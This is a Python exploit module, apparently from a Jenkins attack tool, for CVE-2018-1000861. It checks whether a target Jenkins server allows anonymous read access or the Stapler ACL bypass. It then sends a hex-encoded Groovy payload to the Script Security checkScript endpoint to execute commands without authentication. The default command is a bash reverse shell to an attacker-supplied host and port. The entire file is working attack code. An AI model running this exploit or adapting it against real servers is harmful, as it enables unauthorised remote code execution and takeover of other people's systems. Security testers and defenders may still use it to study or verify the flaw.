"""
CVE-2018-1000861: Jenkins Stapler ACL Bypass and RCE

This exploit leverages a vulnerability in the Stapler web framework to bypass ACL checks
and execute arbitrary code via the Script Security plugin's checkScript endpoint.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2018-1000861"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins Stapler ACL Bypass and RCE",
    description="ACL bypass via Stapler routing combined with Script Security RCE",
    affected_versions=["<= 2.137", "<= 2.121.3 LTS"],
    mitre_attack=["T1190", "T1059"],
    severity="critical",
    references=[
        "https://jenkins.io/security/advisory/2018-12-05/",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-1000861",
        "https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/poc.py"
    ],
    requires_auth=False,
    requires_crumb=False,
    tags=["rce", "acl-bypass", "groovy"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/securityRealm/user/admin/"
        r = requests.get(url, verify=False, timeout=5)
        if r.status_code == 200 and 'adjuncts' in r.text:
            return True
        
        url = f"{tool.jenkins_url}/"
        r = requests.get(url, verify=False, timeout=5)
        if r.status_code == 200 and 'adjuncts' in r.text:
            return True
    except:
        pass
    return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2018-1000861 for ACL bypass and RCE.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Stapler ACL Bypass + RCE)...[/yellow]")
    
    endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
    
    anonymous_read = False
    acl_bypass = False
    exploit_url = None
    
    console.print("[cyan][*] Checking for ANONYMOUS_READ permission...[/cyan]")
    try:
        r = requests.get(tool.jenkins_url, verify=False, timeout=5)
        if r.status_code == 200 and 'adjuncts' in r.text:
            console.print("[green][+] ANONYMOUS_READ enabled[/green]")
            anonymous_read = True
            exploit_url = tool.jenkins_url
    except Exception as e:
        console.print(f"[red][!] Error checking ANONYMOUS_READ: {e}[/red]")
    
    if not anonymous_read:
        console.print("[cyan][*] Checking ACL bypass (CVE-2018-1000861)...[/cyan]")
        try:
            bypass_url = f"{tool.jenkins_url.rstrip('/')}/securityRealm/user/admin/"
            r = requests.get(bypass_url, verify=False, timeout=5)
            if r.status_code == 200 and 'adjuncts' in r.text:
                console.print("[green][+] ACL bypass successful via Stapler routing[/green]")
                acl_bypass = True
                exploit_url = bypass_url
        except Exception as e:
            console.print(f"[red][!] Error checking ACL bypass: {e}[/red]")
    
    if not exploit_url:
        return ExploitResult(
            exploit=CVE_ID,
            status="failed",
            details="Neither ANONYMOUS_READ nor ACL bypass available"
        )
    
    console.print(f"[cyan][*] Checking for checkScript endpoint...[/cyan]")
    check_endpoint = f"{exploit_url.rstrip('/')}/{endpoint}"
    try:
        r = requests.get(check_endpoint, verify=False, timeout=5)
        if r.status_code == 404:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details="checkScript endpoint not found (Script Security plugin not installed)"
            )
    except Exception as e:
        console.print(f"[red][!] Error checking endpoint: {e}[/red]")
    
    cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')
    
    console.print(f"[cyan][*] Executing command: {cmd[:50]}...[/cyan]")
    
    cmd_hex = cmd.encode('utf-8').hex()
    payload = f'public class x{{public x(){{new String("{cmd_hex}".decodeHex()).execute()}}}}'
    
    params = {
        'sandbox': 'true',
        'value': payload
    }
    
    try:
        r = requests.get(
            check_endpoint,
            params=params,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            console.print(f"[green][+] Exploit executed successfully[/green]")
            return ExploitResult(
                exploit=CVE_ID,
                status="success",
                details=f"Command executed via {'ANONYMOUS_READ' if anonymous_read else 'ACL bypass'}",
                data={
                    "command": cmd,
                    "method": "ACL bypass" if acl_bypass else "ANONYMOUS_READ",
                    "endpoint": endpoint
                }
            )
        elif r.status_code == 405:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details="Jenkins has patched the RCE gadget (method not allowed)"
            )
        else:
            details = f"Exploit failed with HTTP status {r.status_code}"
            if 'Caused:' in r.text:
                for line in r.text.splitlines():
                    if line.startswith('Caused:'):
                        details += f" - {line}"
                        break
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=details
            )
            
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Execution error: {str(e)}"
        )
